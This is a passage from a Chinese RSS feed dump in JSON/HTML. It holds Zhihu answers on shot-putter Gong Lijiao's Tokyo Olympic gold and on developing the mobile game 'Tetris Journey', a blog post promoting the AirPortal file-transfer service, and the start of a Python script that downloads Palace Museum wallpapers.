src=\"https://pic2.zhimg.com/v2-2c56d73d1cfa8fb839f74a9ecaaf6807_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-2c56d73d1cfa8fb839f74a9ecaaf6807\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第二投，主动犯规</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1dd4a645d000c2c4d25d87ec81f08fc1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-1dd4a645d000c2c4d25d87ec81f08fc1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第三投继续提升，投出19米98：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d56099cd9a9811f044364b03d5af4993_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-d56099cd9a9811f044364b03d5af4993\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第四投19米80状态回落</p>\n<p><img src=\"https://pic2.zhimg.com/v2-66a45c2c037c1e7b7fc2ea9192bb7c68_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-66a45c2c037c1e7b7fc2ea9192bb7c68\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第五投，一击致命！20米53直接打破个人最好成绩，提升了10厘米！几乎锁定金牌！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-34f8955289870802f7909c3e696d0f0a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-34f8955289870802f7909c3e696d0f0a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第六头继续提升！20米58！金牌，冠军！</p>\n<p>*******</p>\n<p>巩立姣曾说，每一届奥运会都像做梦一样，有的是美梦，有的是噩梦。而5年前的里约，无疑是后者。</p>\n<p>2016年5月，巩立姣投出20米43，刷新尘封七年之久的个人纪录，并创下当年的世界最好成绩。来到里约，她是女子铅球的头号夺金热门。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-334d3cb9e6b6eeb10688d5e36b1c86ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"379\" data-watermark=\"original\" data-original-src=\"v2-334d3cb9e6b6eeb10688d5e36b1c86ee\" data-watermark-src=\"v2-75d3360a37877f97fe58ae2027ae9f90\" data-private-watermark-src=\"v2-1689aff5c56355f232af07b6e7833caf\"></p>\n<p><br>决赛前夜，第三次参加奥运的巩立姣辗转反侧，脑子里不断浮现夺冠的场景，分不清是幻想还是梦境。然而第二天，迎接巩立姣的是残酷的现实，在奥运会的赛场上，她仿佛灵魂出窍。</p>\n<p>“投完第二投我就知道肯定没戏了。”巩立姣后来回忆，“第一次有这种感觉，我是人来疯，那场比赛想赶紧结束，每投一个球都是煎熬。”</p>\n<p>最后一投，巩立姣被匈牙利的马顿逆转，无缘领奖台。返回驻地的大巴上，巩立姣默默对自己说：“别做梦了，醒醒吧，都结束了，你是第四。”巩立姣把自己关在房间里，几天没吃东西，不愿意见人，离开奥运村时，她忍不住在众人面前嚎啕大哭。</p>\n<p>回国后，巩立姣始终不愿意面对冲金失利的现实，陷入抑郁的情绪中无法自拔，一度萌生退意。在德国外教克拉克的建议下，田径队为巩立姣请来了北京师范大学的心理老师，对她进行针对性心理辅导。</p>\n<p>人生中最难熬的时光，巩立姣还是挺了过来，引领她走出阴影的仍然是内心对冠军的渴望。当失意的2016年重新翻篇，巩立姣又一次上路，在三战钻石联赛中夺冠后，她发了一条朋友圈：“当你握紧双手，里面什么都没有；当你打开双手，世界就在你手中。”</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6c67a6ecb07006ca450107dbb2afef8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-6c67a6ecb07006ca450107dbb2afef8a\" data-watermark-src=\"v2-a4a9358616d9c56b9260975d593b4a41\" data-private-watermark-src=\"v2-887727d5e158eeb4901c5034a90fd563\"></p>\n<p>2017年8月，伦敦世锦赛，铅球决赛被安排在第六天。这是伦敦一周以来最冷的一天，秋风刺骨，大雨又为比赛设置了重重障碍。然而用巩立姣的话说，练到这个份上了，雨战又何妨？</p>\n<p>从第一投开始，巩立姣就确立了领先地位，除了里约奥运会冠军卡特在第三投超过19米之外，几乎没人能对巩立姣形成威胁。</p>\n<p>最终，巩立姣用19.94米的成绩杀死了最后的悬念。铅球刚一落地，巩立姣便兴奋地跳了起来，任由泪水和雨水在脸上流淌，对着转播镜头比出“六”的手势——这是她的第六次世锦赛——而观众席上的教练和队友早已把国旗挥舞了起来。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-99bcd9e813cf2cb3ef829b0f9cc8de0c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"296\" data-watermark=\"original\" data-original-src=\"v2-99bcd9e813cf2cb3ef829b0f9cc8de0c\" data-watermark-src=\"v2-b5be3ef93826fdb95bec5df019962512\" data-private-watermark-src=\"v2-f59cfd7b6d746471711a910c371e48e6\"></p>\n<p><br>对巩立姣来说，这个世界冠军拿得水到渠成，酣畅淋漓，也让中国女子铅球时隔24年再次站上世界之巅。“整个冬天都特别难过，还抑郁过一段时间。”巩立姣说，“其实从失败中走出来，回到正轨特别难，但自己还是挺了过来。因为我心里一直都有梦想，那就是站在世界最高领奖台上。我想，只要它还在，总有一天会实现的。”</p>\n<p>站上冠军领奖台，巩立姣哭着唱完国歌，过去十几年的训练画面像电影一样在脑海里过了一遍。‘没有什么比梦想更值得坚持’一直是她的座右铭，在国旗升起的那一刻，她对这句话的理解更深了，对她来说，跌倒后重新爬起来的过程和金牌同样重要。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-75291a00888d5c5166fe1ee0a6e7b3d1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"329\" data-watermark=\"original\" data-original-src=\"v2-75291a00888d5c5166fe1ee0a6e7b3d1\" data-watermark-src=\"v2-9c63db6af50ae1c89cb7430012dae42d\" data-private-watermark-src=\"v2-04d97448704f6c462edc73ddeec9c3f3\"></p>\n<p><br>2018年，从玉珍取代外教克拉克接管巩立姣，上任之后她给弟子布置了一个艰巨的任务——增重。“2015年我体重大约110公斤，当时教练觉得我脚下速度慢，想让我通过减重提爆发力。”巩立姣说，“不到一年我减了近15公斤，没想到减完之后，脚下的速度是上去了，手上的劲儿却没了。没办法，还得根据实际情况再增回来。一开始因为节食缩小的胃，为了增肥又得强行撑起来。那段时间害怕吃饭，每多吃一口都难受。”</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9c15be4113c2493bbff3c11d8b549f7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-9c15be4113c2493bbff3c11d8b549f7e\" data-watermark-src=\"v2-4fc5232190311c1be368189dcf356dad\" data-private-watermark-src=\"v2-8f64bf1abbe757217a818bbe10b2cb4f\"></p>\n<p>台上一分钟，台下十年功，粗略估计，巩立姣在训练中的投掷量达到几十万次。常年累月的高强度训练让巩立姣浑身是伤，每到阴雨天，右臂和左腿的关节就会隐隐作痛。为了减少伤病困扰，教练组借助更科学的手段，将巩立姣的训练精细化、数据化，重质量、轻数量，以前每天至少投200次，而现在一周也不过投200次。在投掷量减小的基础上，从玉珍把巩立姣的训练用球从6公斤改为8公斤。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ce4746599a6cf7a84f8379b1f4aa57ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"1332\" data-watermark=\"original\" data-original-src=\"v2-ce4746599a6cf7a84f8379b1f4aa57ad\" data-watermark-src=\"v2-98bcd10380b09497e1db3e3401253143\" data-private-watermark-src=\"v2-fddb18c70667a9d6295b68cc0e2ec6b5\"></p>\n<p>夺得伦敦世锦赛冠军后，巩立姣彻底打破了魔咒，进入一种独孤求败的状态，从2017年开始连续三年世界排名第一。2019年，巩立姣在参加的14项比赛中获得13枚金牌，其中包括在多哈世锦赛上完成卫冕，连续第三年赢下钻石联赛决赛。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-70b7f6dcfa6b38cb4e0bfcef93c8271a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-watermark=\"original\" data-original-src=\"v2-70b7f6dcfa6b38cb4e0bfcef93c8271a\" data-watermark-src=\"v2-2cf0ac8a1db537d5df933da3b34af29f\" data-private-watermark-src=\"v2-fdf5f4f819c8914677497cfe0630bd85\"></p>\n<p>唯一让巩立姣失望的是世锦赛的成绩，仅仅投出19.55米，仅比亚军托马斯-多德多了8厘米，创下史上最低夺冠成绩，在此之前世锦赛的最低夺冠成绩是1999年的19.85米。即便如此，巩立姣依然对东京奥运的前景保持乐观，“这个冠军对我也是一种鼓励，让我更加自信。状态这么差都能拿下冠军，等我恢复状态肯定就更没有问题了。”</p>\n<p>虽然过去几年罕有敌手，但是巩立姣丝毫不敢懈怠，一直在尝试调整自己的技术动作。在女子铅球的顶尖选手中，巩立姣的身高和体重并没有优势，她只能在技术层面追求极致。</p>\n<p>外教克拉克执教期间，巩立姣对步伐和步频进行了修正，同时加强了体能储备。到了东京周期的冲刺阶段，巩立姣的训练重点变成了调整滑步距离，让动作变得更舒展。为了把改动作的风险降到最低，田径队专门请来了美国的心理专家，调整巩立姣的心态。</p>\n<p>2019年12月，收到那枚迟到11年的奥运奖牌之后，巩立姣在北京体育大学进行了一场题为《冠军》演讲，她表示为了回应外界的质疑，夺取东京奥运会的金牌是她必须做出的回应。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-228cfbcd57a9a3129cde37a0be62d929_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"326\" data-watermark=\"original\" data-original-src=\"v2-228cfbcd57a9a3129cde37a0be62d929\" data-watermark-src=\"v2-c67005c5e8cb39c8cb40a61bf0cedd06\" data-private-watermark-src=\"v2-f7133710e7f63fe9d19b1882777d17f3\"></p>\n<p><br>就在巩立姣按部就班进行备战时，东京奥运会宣布延期，对任何一个老将而言，这都不是一个好消息。“当时那个月，我觉得整个人都垮掉了。”巩立姣回忆，“因为那一年我练得很好，2月份时成绩就突破了20米，那时候眼里只有奥运会。”</p>\n<p>备战计划的调整让巩立姣的身体亮起了红灯，左膝出现了严重的水肿，连走路都成了问题，只能坐着投球，她觉得天都塌了下来。在北京体育大学那间小宿舍里，巩立姣把事情想开了，“幸好不是取消，延期我也没事，虽然体力、体能可能会有所下降，但好事多磨，我又多了一些时间去准备，就更十拿九稳了，我会争取把最好的状态留到明年。”</p>\n<p><img src=\"https://pic2.zhimg.com/v2-559b3599f9ac2243ba058d79d246f421_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"1365\" data-watermark=\"original\" data-original-src=\"v2-559b3599f9ac2243ba058d79d246f421\" data-watermark-src=\"v2-4a9111b6bf769a3f172cae6cc57f7c1a\" data-private-watermark-src=\"v2-56d3b1c355ea3faea50d8c3c0b254893\"></p>\n<p>巩立姣没有食言，今年她在参加的7场比赛里，有两场的成绩都超过了20米。6月中旬在绍兴举办的奥运选拔赛中，巩立姣投出20.31米，创下本赛季世界最好成绩。十几天后，巩立姣在全运会选拔赛中更进一步，投出了20.39米，创下个人生涯第二好成绩。值得一提的是，她在这次比赛中有三次试投超过20米。“我感觉已经把奥运会金牌装兜里了，挂在这呢，一伸手就拿到了。”</p>\n<p>今年5月，奥委会官网对巩立姣进行了专题报道，文中提到，21这个数字对她有着特别的意义：奥运会延迟到2021年，今年是她从事铅球的第21个年头，而她的目标是突破21米。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c8703afdd23adfcffb3caf503052f2a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"367\" data-watermark=\"original\" data-original-src=\"v2-0c8703afdd23adfcffb3caf503052f2a\" data-watermark-src=\"v2-814eeffe59297b3cd517c5b0b54118ff\" data-private-watermark-src=\"v2-fe6679891e8d26c3dcb04a26382ede60\"></p>\n<p><br>出征东京之前，巩立姣发了一条微博：“第四次参加奥运会，稳扎稳打，决胜东京，为国争光。”这一次，她终于做到了，在登上领奖台的那一刻，她的耳边一定响起了刘德华的那首歌：“等了好久终于等到今天，梦了好久终于把梦实现。”</p>\n<p>********</p>\n<p>卑微的贴二维码求关注我们的小破号：后厂村体工队</p>\n<p><img src=\"https://pic1.zhimg.com/v2-45c3be1acccc90aaca7c5418d388aa34_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"346\" data-watermark=\"original\" data-original-src=\"v2-45c3be1acccc90aaca7c5418d388aa34\" data-watermark-src=\"v2-e810e32a9b273de5249d0fa76d8daca8\" data-private-watermark-src=\"v2-16c4bcdabd4ea616588c61802f8468f1\" data-qrcode-value=\"http://weixin.qq.com/r/rnVCWl3EYgAdrRk59yC8\" data-tags=\"qrcode\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yi-ti-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">网易体育</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">202 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/477421696?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待2020东京奥运会美国男子接力没有进入决赛？</a><br><a href=\"http://www.zhihu.com/question/475915462?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会体操女子个人全能决赛唐茜靖第 7 芦玉菲第 18 ？</a><br>\n","link":"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价手游《俄罗斯方块环游记》？","date":"2021-07-31 15:30:07","description":"\n<p><b>大家好，我是《俄罗斯方块环游记》的制作人Poly，感谢@知乎游戏 的邀请。大家看到这个答案的时候《俄罗斯方块环游记》已经上线了，但这个答案中的很多故事、想法、感慨已经在心里酝酿了很久，很高兴有这个机会能够转化为文字跟大家分享。</b></p>\n<p>1、立项初衷</p>\n<p>我是个健忘的人，当要开始写这段故事的时候，我下意识的翻了一下2017年年底的照片以帮助我回忆。看了会照片后我想起很多事情，比如那时候我还一根白头发没有，养了一只叫布丁的花枝鼠，姥姥还在。</p>\n<p>刚接触Tetris时，它最吸引我们团队的地方是和一般的IP，例如故事、角色形象不一样，Tetris是一个家喻户晓的玩法。而我们又是一群特别喜欢设计新玩法的团队，我能想象也期望着它的变化与玩法延展能给我们一个大的发挥空间，这是件令人兴奋的事情。我用了一个月的时间来研究现代俄罗斯方块的各个版本，深入研究后，我发现原来在国外俄罗斯方块已经在各种平台上演变出了大小玩法上百种的新内容和规则变化，而这些新模式我们在国内很多人之前都没有玩到过。所以我当时我就很希望这款手游能承载这个小目标，能让国人玩到这些新内容，能给大家带来一些关于俄罗斯方块的惊喜。</p>\n<p><b>2、初次测试反馈</b></p>\n<p>第一个版本是在开发几个月时候在tap上测试的，这是一个完全创新，又有些“放飞自我“的版本。我记得几个月前和模电一起吃饭，临走时候他和我说，第一个版本是他最喜欢的版本。我不想对此发表我的想法，但是我理解他的意思。那是一个纯粹的tetis粉丝版本，那个版本有点小众。我记得当时每天都在看玩家的反馈，每晚到凌晨还在看玩家在世界频道说什么。总结来说，那个版本偏难。手感也有很多问题，如果是经常接触现代俄罗斯方块的玩家会觉得难度刚刚好，且他们对我们游戏当时的操作有很高的包容性。但是对于绝大多数新玩家来说，游戏的关卡设计太偏向解密性质了，而且那个版本当时还没来及做充足的新手指引。这让很多玩家在前期关卡卡住而消失。测试后的数据很不理想，我大概自闭了5天左右，不想和任何人说话。我把大家反馈的问题记录下来，写了很长的一个反思文，嗯….一个土黄色的PPT长文。以用于后续的版本调整。</p>\n<p>后面随着调整和优化，测试的数据也在逐步变好。我想和所有反馈给环游记建议的玩家说一声：谢谢…这句苍白的话是真诚的。</p>\n<p><b>3、在PVE和PVP中抉择</b></p>\n<p>虽然说如果问大家说是否知道俄罗斯方块，大家可能很多人都说知道，也会说会玩。但是我们的调研发现，大部分同学对于俄罗斯方块的认知，还是处于很早前的那个游戏机上的原始版本。对于俄罗斯方块如何对战，如何攻击对手，如何KO对手，还是比较模糊的。之前我们做过一次以PVP为起始的版本，数据不是很理想，其主要原因有2个，上面我说的是其中一个，就是大家会玩俄罗斯方块，但是不知道如何去击败对手。而俄罗斯方块的攻击规则又相对比较复杂，它和你的操作效率成正比。加上大家在之前也很少在手机上练习俄罗斯方块的操作手速，这2个问题抬高了玩家参与PVP的上手难度。玩家会因为手速和脑速不符在前期很容易在PVP中出现挫败感，而这种挫败感会让体验的玩家感到不适。</p>\n<p>所以在经过多次测试后，我们将更加简单、轻松的PVE关卡放在了游戏体验的开始。大家可以先了解规则，使用操作，熟练操作，然后再逐步解锁PVP的各个系统。</p>\n<p>当然，为了让喜欢俄罗斯方块竞技的老手们快速的体验到他们想玩的内容，我们的PVP解锁不仅可以通过打关卡和等级，也可以通过在经典马拉松中测试手速，如果手速达到标准，可以直接解锁竞技！</p>\n<p><b>4、上线后的一些感慨</b></p>\n<p>希望大家对小环游能多一些耐心和包容。因为俄罗斯方块环游记的整个开发并没有很好的前车之鉴，我们在整个近4年的的设计与开发就像一条没有路的登山一样，一直是在不停的探索、摸索，但我们是用真心在做这个游戏。我常常和研发同学说，游戏作为一种娱乐性质的产品，只有你自己快乐，才能把它流露在游戏中，让大家体验到快乐。但是很遗憾，虽然这一路开发环游记我们很沉迷和喜爱这个过程，但是这个过程也有很多迷茫的时候，困难不断，我们常常也会遇到很多挫折和受挫，而这些五味杂陈的情感可能也多多少少进入了游戏的设计细胞中，我认为它不一定是件坏事，因为有了这些苦辣酸甜感，或许会让环游记的故事变得更加饱满。但是呢，在环游记骨子里，它依然是那个儿时的少年，像三十多年前它带给大家快乐，让大家沉浸于码块，那个超越国界，超越种族，让全世界都喜欢的那个正能量的”小朋友“，真心的希望大家在上线后对小环游多多包容它,多多支持它~</p>\n<p>最后，我想谢谢一路陪伴我们测试的方块超人们，这3年多来你们的反馈，你们的鼓励，一直是我们前方的灯。可能你们不知道，有好多好多好多的时光里，当我们开发出现困境的时候，我们常常会内部相互转发你们在评论里给我们的鼓励，包括一直督促我们抓紧上线，督促我们抓紧优化，我们其实每一条评论都看了....这一路虽然很艰难，但是我总和身边的大家说：有喜欢你游戏的人，是一种荣幸，无论人多人少，我们都要珍惜喜欢它的每一个玩家。因为是广大方块超人们的鼓励，让我们一直坚持下来。</p>\n<p>鞠躬+敬礼(^^ゞ！！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b0933ed8a45cf6a1e8eb39c6827ab2e1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"290\" data-rawheight=\"234\" data-watermark=\"watermark\" data-original-src=\"v2-b0933ed8a45cf6a1e8eb39c6827ab2e1\" data-watermark-src=\"v2-282379d843e5346f3a161ae121cf8638\" data-private-watermark-src=\"v2-c68fa1807555b2d71e4fbc87cd182281\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/waltz-68?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Poly</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">8 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20401449?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你会怎样向一个从没玩过俄罗斯方块的人解释这个游戏的玩法？</a><br><a href=\"http://www.zhihu.com/question/28928581?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么国内连连看比俄罗斯方块火得多？</a><br>\n","link":"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, 